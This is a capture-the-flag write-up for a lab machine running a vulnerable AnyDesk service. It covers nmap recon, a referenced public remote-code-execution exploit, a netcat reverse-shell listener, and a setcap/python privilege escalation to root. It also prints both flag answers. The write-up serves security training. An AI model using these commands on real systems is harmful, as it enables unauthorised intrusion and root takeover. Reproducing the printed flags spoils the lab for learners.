# Annie
https://tryhackme.com/room/annie

## Recon
```
$ nmap -sV --script safe -p 22,7070 annie.thm
# Nmap 7.92 scan initiated Wed Sep  7 18:50:15 2022 as: nmap -sV --script safe -p 22,7070 -oN nmap_safe.txt annie.thm
Pre-scan script results:
|_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
| broadcast-igmp-discovery:
|   10.151.6.1
|     Interface: eth0
|     Version: 2
|     Group: 224.0.0.106
|     Description: All-Snoopers (rfc4286)
|   10.151.6.1
|     Interface: eth0
|     Version: 2
|     Group: 224.0.0.251
|     Description: mDNS (rfc6762)
|_  Use the newtargets script-arg to add the results as targets
| targets-asn:
|_  targets-asn.asn is a mandatory parameter
|_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
|_eap-info: please specify an interface with -e
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     Interface: eth0
|     IP Offered: 10.151.6.185
|     Server Identifier: 10.151.6.1
|     Subnet Mask: 255.255.255.0
|     Broadcast Address: 10.151.6.255
|     Router: 10.151.6.1
|     Domain Name Server: 10.151.6.1
|_    Domain Name: lxd
Nmap scan report for annie.thm (10.10.228.67)
Host is up (0.052s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
|_banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.6
| ssh2-enum-algos:
|   kex_algorithms: (10)
|   server_host_key_algorithms: (5)
|   encryption_algorithms: (6)
|   mac_algorithms: (10)
|_  compression_algorithms: (2)
| ssh-hostkey:
|   2048 72:d7:25:34:e8:07:b7:d9:6f:ba:d6:98:1a:a3:17:db (RSA)
|   256 72:10:26:ce:5c:53:08:4b:61:83:f8:7a:d1:9e:9b:86 (ECDSA)
|_  256 d1:0e:6d:a8:4e:8e:20:ce:1f:00:32:c1:44:8d:fe:4e (ED25519)
| vulners:
|   cpe:/a:openbsd:openssh:7.6p1:
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19    *EXPLOIT*
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    *EXPLOIT*
|       EDB-ID:46516    5.8     https://vulners.com/exploitdb/EDB-ID:46516      *EXPLOIT*
|       EDB-ID:46193    5.8     https://vulners.com/exploitdb/EDB-ID:46193      *EXPLOIT*
|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111
|       1337DAY-ID-32328        5.8     https://vulners.com/zdt/1337DAY-ID-32328        *EXPLOIT*
|       1337DAY-ID-32009        5.8     https://vulners.com/zdt/1337DAY-ID-32009        *EXPLOIT*
|       SSH_ENUM        5.0     https://vulners.com/canvas/SSH_ENUM     *EXPLOIT*
|       PACKETSTORM:150621      5.0     https://vulners.com/packetstorm/PACKETSTORM:150621      *EXPLOIT*
|       EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    5.0     https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    *EXPLOIT*
|       EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    5.0     https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    *EXPLOIT*
|       EDB-ID:45939    5.0     https://vulners.com/exploitdb/EDB-ID:45939      *EXPLOIT*
|       EDB-ID:45233    5.0     https://vulners.com/exploitdb/EDB-ID:45233      *EXPLOIT*
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
|       CVE-2018-15473  5.0     https://vulners.com/cve/CVE-2018-15473
|       1337DAY-ID-31730        5.0     https://vulners.com/zdt/1337DAY-ID-31730        *EXPLOIT*
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110
|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109
|       CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685
|       PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT*
|       MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-        0.0     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS- *EXPLOIT*
|_      1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937        *EXPLOIT*
7070/tcp open  tcpwrapped
|_unusual-port: tcpwrapped unexpected on port tcp/7070
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_ipidseq: ERROR: Script execution failed (use -d to debug)
| qscan:
| PORT  FAMILY  MEAN (us)  STDDEV    LOSS (%)
| 22    0       81274.40   61058.92  0.0%
|_7070  0       104648.30  64762.23  0.0%
| dns-blacklist:
|   SPAM
|     list.quorum.to - FAIL
|     l2.apews.org - FAIL
|_    dnsbl.inps.de - FAIL
| port-states:
|   tcp:
|_    open: 22,7070
| resolveall:
|   Host 'annie.thm' also resolves to:
|   Use the 'newtargets' script-arg to add the results as targets
|_  Use the --resolve-all option to scan all resolved addresses without using this script.
|_fcrdns: FAIL (No PTR record)
|_path-mtu: 1006 <= PMTU < 1492

Post-scan script results:
| reverse-index:
|   22/tcp: 10.10.228.67
|_  7070/tcp: 10.10.228.67
```

--script safe shows ssl-cert info for port 7070:
```
| ssl-cert: Subject: commonName=AnyDesk Client
```
```
$ nmap -sV --script safe -p 7070 10.10.228.67
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-07 19:00 UTC
Pre-scan script results:
| targets-asn:
|_  targets-asn.asn is a mandatory parameter
|_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     Interface: eth0
|     IP Offered: 10.151.6.185
|     Server Identifier: 10.151.6.1
|     Subnet Mask: 255.255.255.0
|     Broadcast Address: 10.151.6.255
|     Router: 10.151.6.1
|     Domain Name Server: 10.151.6.1
|_    Domain Name: lxd
|_eap-info: please specify an interface with -e
|_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
| broadcast-igmp-discovery:
|   10.151.6.1
|     Interface: eth0
|     Version: 2
|     Group: 224.0.0.106
|     Description: All-Snoopers (rfc4286)
|   10.151.6.1
|     Interface: eth0
|     Version: 2
|     Group: 224.0.0.251
|     Description: mDNS (rfc6762)
|_  Use the newtargets script-arg to add the results as targets
Nmap scan report for annie.thm (10.10.228.67)
Host is up (0.050s latency).

PORT     STATE SERVICE         VERSION
7070/tcp open  ssl/realserver?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=AnyDesk Client
| Not valid before: 2022-03-23T20:04:30
|_Not valid after:  2072-03-10T20:04:30

Host script results:
|_path-mtu: 1006 <= PMTU < 1492
|_ipidseq: ERROR: Script execution failed (use -d to debug)
| unusual-port:
|_  WARNING: this script depends on Nmap's service/version detection (-sV)
|_fcrdns: FAIL (No PTR record)
| port-states:
|   tcp:
|_    open: 7070
| dns-blacklist:
|   SPAM
|     l2.apews.org - FAIL
|     list.quorum.to - FAIL
|_    dnsbl.inps.de - FAIL

Post-scan script results:
| reverse-index:
|_  7070/tcp: 10.10.228.67
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.75 seconds
```

For whatever reason, the ssl-cert info is only displayed intermittently, but 
with --script ssl-cert we can get it reliably:
```
$ nmap -sV --script ssl-cert -p 7070 10.10.228.67
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-07 19:08 UTC
Nmap scan report for annie.thm (10.10.228.67)
Host is up (0.051s latency).

PORT     STATE SERVICE         VERSION
7070/tcp open  ssl/realserver?
| ssl-cert: Subject: commonName=AnyDesk Client
| Issuer: commonName=AnyDesk Client
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-03-23T20:04:30
| Not valid after:  2072-03-10T20:04:30
| MD5:   3e57 6c44 bf60 ef79 7999 8998 7c8d bdf0
|_SHA-1: ce6c 79fb 669d 9b19 5382 8cec c8d5 50b6 2e36 475b

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.85 seconds
```

Guessing its AnyDesk. Not sure which version.
RCE vuln available:
https://nvd.nist.gov/vuln/detail/CVE-2020-13160
https://www.exploit-db.com/exploits/49613
Also available in metasploit.
Note: The script requires python2.7, and the #!/usr/bin/python2.7 line needs
to be at the top of the file.
Generate shellcode with the correct IP:PORT

#### Q: Why is port=50001 and not 7070?
```
From https://support.anydesk.com/knowledge/settings
Local Port Listening
For direct connections, TCP Port 7070 is used for listening by default. This port is opened when installing AnyDesk.

From https://support.anydesk.com/knowledge/firewall
Ports & Whitelist
AnyDesk clients use the TCP-Ports 80, 443, and 6568 to establish connections. It is however sufficient if just one of these is opened.

AnyDesk's "Discovery" feature uses a free port in the range of 50001–50003 and the IP 239.255.102.18 as default values for communication.
```
Ie. the exploit exploits the Discovery feature.

Got a shell on our listener:
```
$ nc -lvnp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.228.67.
Ncat: Connection from 10.10.228.67:51494.
id
uid=1000(annie) gid=1000(annie) groups=1000(annie),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
```

cat /home/annie/user.txt

### Question: user.txt
THM{N0t_Ju5t_ANY_D3sk}

## Privesc
### suid binaries:
```
$ find / -type f -perm -04000 -ls 2>/dev/null
annie@desktop:/home/annie$ find / -type f -perm -04000 -ls 2>/dev/null
   131142     12 -rwsr-xr-x   1 root     root        10232 Nov 16  2017 /sbin/setcap
   655379     44 -rwsr-xr-x   1 root     root        43088 Sep 16  2020 /bin/mount
   655430     64 -rwsr-xr-x   1 root     root        64424 Jun 28  2019 /bin/ping
   655397     44 -rwsr-xr-x   1 root     root        44664 Jan 25  2022 /bin/su
   655514     32 -rwsr-xr-x   1 root     root        30800 Aug 11  2016 /bin/fusermount
   655423     28 -rwsr-xr-x   1 root     root        26696 Sep 16  2020 /bin/umount
   803938    372 -rwsr-xr--   1 root     dip        378600 Jul 23  2020 /usr/sbin/pppd
   786802     12 -rwsr-xr-x   1 root     root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
   804179    428 -rwsr-xr-x   1 root     root       436552 Mar  2  2020 /usr/lib/openssh/ssh-keysign
   138895     16 -rwsr-xr-x   1 root     root        14328 Jan 12  2022 /usr/lib/policykit-1/polkit-agent-helper-1
   138962     12 -rwsr-sr-x   1 root     root        10232 Dec 14  2021 /usr/lib/xorg/Xorg.wrap
   799962     44 -rwsr-xr--   1 root     messagebus    42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   803534     24 -rwsr-xr-x   1 root     root          22528 Jun 28  2019 /usr/bin/arping
   788281     40 -rwsr-xr-x   1 root     root          40344 Jan 25  2022 /usr/bin/newgrp
   799147    148 -rwsr-xr-x   1 root     root         149080 Jan 19  2021 /usr/bin/sudo
   799099     20 -rwsr-xr-x   1 root     root          18448 Jun 28  2019 /usr/bin/traceroute6.iputils
   787313     76 -rwsr-xr-x   1 root     root          76496 Jan 25  2022 /usr/bin/chfn
   787330     76 -rwsr-xr-x   1 root     root          75824 Jan 25  2022 /usr/bin/gpasswd
   787328     44 -rwsr-xr-x   1 root     root          44528 Jan 25  2022 /usr/bin/chsh
   787331     60 -rwsr-xr-x   1 root     root          59640 Jan 25  2022 /usr/bin/passwd
   801215     24 -rwsr-xr-x   1 root     root          22520 Jan 12  2022 /usr/bin/pkexec
```
According to hacktricks, setcat could be used for privesc:
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#privesc-container-escape

```
annie@desktop:/home/annie$ setcap cap_setuid+ep /usr/bin/python3.6
annie@desktop:/home/annie$ getcap /usr/bin/python3.6
/usr/bin/python3.6 = cap_setuid+ep
annie@desktop:/home/annie$ /usr/bin/python3.6 -c 'import os;os.setuid(0);os.system("/bin/bash")'
root@desktop:/home/annie# id
uid=0(root) gid=1000(annie) groups=1000(annie),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
root@desktop:/home/annie# ls /root
THM-Voucher.txt  root.txt
root@desktop:/root# cat root.txt 
THM{0nly_th3m_5.5.2_D3sk}
```
